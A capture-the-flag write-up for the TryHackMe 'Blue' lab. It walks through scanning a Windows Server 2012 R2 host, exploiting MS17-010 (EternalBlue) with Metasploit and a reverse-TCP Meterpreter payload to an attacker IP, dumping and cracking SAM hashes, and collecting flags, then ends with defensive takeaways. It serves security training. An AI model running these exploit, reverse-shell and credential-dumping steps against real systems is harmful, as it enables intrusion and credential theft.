# TryHackMe - Blue

**Difficulty:** Easy | **Category:** Windows / Boot2Root | **Time:** 30 min

## Summary
A Windows Server 2012 R2 host exposed on SMB with an unpatched SMBv1 stack. Confirmation of **MS17-010 (EternalBlue)** leads to remote code execution as `NT AUTHORITY\SYSTEM` through Metasploit. Because the exploit already lands with the highest privilege level, "privilege escalation" consists of abusing that access to dump the SAM database, crack the local account hashes, and loot the three flags.

## Reconnaissance

### Port scan
```bash
nmap -sC -sV -Pn <TARGET_IP>
```

**Results:**
- `135/tcp` - Microsoft RPC
- `139/tcp` - NetBIOS Session Service
- `445/tcp` - microsoft-ds (**Windows Server 2012 R2 Datacenter 9600**)
- `3389/tcp` - Microsoft Terminal Services (RDP)
- `5985/tcp` - WinRM (Microsoft HTTPAPI 2.0)
- `49152-49175/tcp` - dynamic RPC endpoints

Three ports are below 1000: **135, 139, 445**.

### SMB enumeration
The Nmap script output already carried the decisive finding:

```
smb2-security-mode:
  3.0.2:
    Message signing enabled but not required
smb-security-mode:
  message_signing: disabled (dangerous, but default)
smb-os-discovery:
  OS: Windows Server 2012 R2 Datacenter 9600
  Computer name: <HOSTNAME>
```

Message signing not being enforced is a strong indicator of an unpatched host and also enables relay attacks. Combined with an open SMBv1 service, the target matches the EternalBlue profile.

## Exploitation - Confirming MS17-010

A targeted scan confirms the vulnerability in under a second:

```bash
nmap -p 445 --script smb-vuln-ms17-010 <TARGET_IP>
```

```
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
```

*Note: the full `-sC` scan took 127 seconds; running the single relevant script took 0.88 seconds. Targeting one check is far more efficient than executing the entire default script set.*

## Exploitation - EternalBlue via Metasploit

```bash
msfconsole
```

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
set LHOST <ATTACKER_TUN0_IP>
set payload windows/x64/meterpreter/reverse_tcp
run
```

The exploit performs heap grooming before delivering the shellcode:

```
[+] Host is likely VULNERABLE to MS17-010!
[+] got good NT Trans response
[+] SMB1 session setup allocate nonpaged pool success
[+] good response status for nx: INVALID_PARAMETER
[*] Sending stage (255678 bytes) to <TARGET_IP>
[*] Meterpreter session 1 opened
```

**Reliability note:** the first attempt failed with `Read timeout expired when reading from the Socket`. This is expected behaviour for EternalBlue, which depends on a memory race. The host was still responsive (the exploit had not crashed it), and a simple re-run of `run` succeeded. Attempts may need to be repeated two or three times.

## Flag 1 - system root

With a Meterpreter session running as `NT AUTHORITY\SYSTEM`, the flag at the filesystem root is readable:

```
meterpreter > cat C:/flag1.txt
```

Format: `flag{...}`. *Flag value kept private per TryHackMe content rules.*

## Credential dumping and cracking

`hashdump` extracts the local SAM hashes:

```
Administrator:500:...:f3118544a831e728781d780cfdb9c1fa:::
Guest:501:...:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1002:...:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

The `Guest` hash is the well-known empty-password value. The two others are cracked offline with John the Ripper:

```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=NT --show hashes.txt
```

Both fall to a common wordlist within seconds — evidence that local account passwords are dictionary-based.

## Flags 2 and 3 - location matters

Being `SYSTEM` means every file on the volume is readable, including directories a normal user cannot traverse:

- The second flag sits in `C:\Windows\System32\config\`, the directory that holds the SAM database. Reading it requires SYSTEM privileges, which is the point of the exercise.
- The third flag sits among the administrator's documents, served as a reminder that administrator workstations and profiles are high-value looting targets.

Flags 2 and 3 use the `flag{...}` format. *Values kept private per TryHackMe content rules.*

## Key Takeaways

1. **Patch management is the whole ballgame here.** MS17-010 was fixed in March 2017; this host is a living example of why the SMB patch cycle matters. Disabling SMBv1 removes the vulnerability class entirely.
2. **Enforce SMB signing.** `Message signing enabled but not required` is a misconfiguration that enables relay attacks even on patched hosts.
3. **Targeted scanning beats brute scanning.** `--script smb-vuln-ms17-010` returned the answer in 0.88s versus 127s for the default script set. Know which check you need before you run it.
4. **EternalBlue is unreliable by design.** A failed attempt is not a dead end — verify the host is still alive, then retry.
5. **Offline hash cracking sets the real password policy.** NTLM hashes without salts can be tested at millions of guesses per second; anything in a public dictionary falls immediately.
6. **`NT AUTHORITY\SYSTEM` is not Administrator.** It is the kernel-level account and can read objects the Administrator cannot. SAM and other protected stores require it, which is why privilege escalation to SYSTEM is a goal in itself.
7. **Exploit success does not guarantee a stable session.** Migration to a long-running system process is standard practice to survive service restarts.
